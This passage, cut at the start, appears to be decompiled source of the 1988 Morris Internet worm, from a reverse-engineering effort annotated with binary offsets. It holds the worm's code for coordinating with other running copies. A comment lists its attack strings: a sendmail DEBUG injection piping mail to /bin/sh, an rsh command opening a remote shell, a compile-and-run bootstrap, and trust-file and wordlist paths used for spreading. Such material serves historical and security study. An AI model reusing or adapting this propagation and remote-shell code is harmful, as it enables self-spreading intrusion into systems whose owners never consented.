	    close(s);
	    return;
	}
	
	if (!((l12+l16) % 2))
	    pleasequit++;
	close(s);
    }
    sleep(5);
    
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0)
	return;
    
    /* Set the socket so that the address may be reused */
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
    if (bind(s, &sin, sizeof(sin)) < 0) {
	close(s);
	return;
    }
    listen(s, 10);
    
    other_fd = s;
    return;
}

/* Sleep, waiting for another worm to contact me. */
void other_sleep(int how_long)				/* 0x5a38 */
{
    int nfds, readmask;
    long time1, time2;
    struct timeval timeout;
    
    if (other_fd < 0) {
	if (how_long != 0)
	    sleep(how_long);
	return;
    }
    /* Check once again.. */
    do {
	if (other_fd < 0)
	    return;
	readmask = 1 << other_fd;
	if (how_long < 0)
	    how_long = 0;
	
	timeout.tv_sec = how_long;
	timeout.tv_usec = 0;
	
	if (how_long != 0)
	    time(&time1);
	nfds = select(other_fd+1, &readmask, 0, 0, &timeout);
	if (nfds < 0)
	    sleep(1);
	if (readmask != 0)
	    answer_other();
	if (how_long != 0) {
	    time(&time2);
	    how_long -= time2 - time1;
	}
    } while (how_long > 0);
    return;
}

static void answer_other()				/* 0x5b14 */
{
    int ns, addrlen, magic_holder, magic1, magic2;
    struct sockaddr_in sin;			/* 16 bytes */
    
    addrlen = sizeof(sin);
    
    ns = accept(other_fd, &sin, &addrlen);
    
    if (ns < 0)
	return;					/* 620 */
    
    magic_holder = MAGIC_1;
    if (write(ns, &magic_holder, sizeof(magic_holder)) != sizeof(magic_holder)
) {
	close(ns);
	return;
    }
    if (xread(ns, &magic_holder, sizeof(magic_holder), 10) != sizeof(magic_holder)) {
	close(ns);
	return;
    }
    if (magic_holder != MAGIC_2) {
	close(ns);
	return;
    }
    
    magic1 = random() / 8;
    if (write(ns, &magic1, sizeof(magic1)) != sizeof(magic1)) {
	close(ns);
	return;
    }
    if (xread(ns, &magic2, sizeof(magic2), 10) != sizeof(magic2)) {
	close(ns);
	return;
    }
    close(ns);
    
    if (sin.sin_addr.s_addr != inet_addr(XS("127.0.0.1")))
	return;
    
    if (((magic1+magic2) % 2) != 0) {
	close(other_fd);
	other_fd = -1;
	pleasequit++;
    }
    return;
}

/* A timeout-based read. */
int xread(int fd, char *buf, unsigned long length, int time) /* 0x5ca8 */
{
    int i, cc, readmask;
    struct timeval timeout;
    int nfds;
    long time1, time2;
    
    for (i = 0; i < length; i++) { 		/* 150 */
	readmask = 1 << fd;
	timeout.tv_sec = time;
	timeout.tv_usec = 0;
	if (select(fd+1, &readmask, 0, 0, &timeout) < 0)
	    return 0;				/* 156 */
	if (readmask == 0)
	    return 0;
	if (read(fd, &buf[i], 1) != 1)
	    return 0;
    }
    return i;
}


/* 
 * These are some of the strings that are encyphed in the binary.  The
 * person that wrote the program probably used the Berkeley 'xstr' program
 * to extract and encypher the strings.
 */
#ifdef notdef
char environ[50] = "";
char *sh = "sh";
char *env52 = "sh";			/* 0x20034, <environ+52> */
char *env55 = "-p";
char *env58 = "l1.c";
char *env63 = "sh";
char *env66 = "/tmp/.dump";
char *env77 = "128.32.137.13";
char *env91 = "127.0.0.1";
char *env102 = "/usr/ucb/netstat -r -n";	/* 0x20066 */
char *env125 = "r";
char *env127 = "%s%s";
#endif /* notdef*/
/*
  char *text =
  "default
  0.0.0.0
  127.0.0.1
  exec /bin/sh
  l1.c
  PATH=/bin:/usr/bin:/usr/ucb
  cd /usr/tmp
  x%d.c
  echo gorch49;sed '/int zz;/q' > %s;echo gorch50
  gorch49
  int zz;
  gorch50
  cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE
  DONE
  x%d,%s
  PATH=/bin:/usr/bin:/usr/ucb
  rm -f sh
  if [ -f sh ]
  then
  P=x%d
  else
  P=sh
  cc -o $P %s
  ./$P -p $$ 
  rm -f $P
  rm -f %s $P
  l1.c
  cd /usr/tmp
  x%d.c
  cat > %s <<'EOF'
  cc -o x%d x%d.c;x%d %s %d %d;rm -f x%d x%d.c
  /usr/ucb/rsh
  /usr/bin/rsh
  /bin/rsh
  /bin/echo %s
  debug
  mail from:</dev/null>
  rcpt to:<"| sed '1,/^$/d' | /bin/sh ; exit 0">
  data
  quit
  quit
  exec /usr/ucb/rsh %s -l %s 'exec /bin/sh'
  /bin/sh
  /bin/sh
  127.0.0.1
  127.0.0.1
  /etc/hosts.equiv
  %.100s
  /.rhosts
  %.200s/.forward
  %.20s%.20s
  %[^ ,]
  %*s %[^ ,]s
  %.200s/.forward
  %.200s/.rhosts
  %s%s
  /usr/dict/words";
  */

/*
 * Local variables:
 * compile-command: "cc -S hs.c"
 * comment-column: 48
 * End:
 */
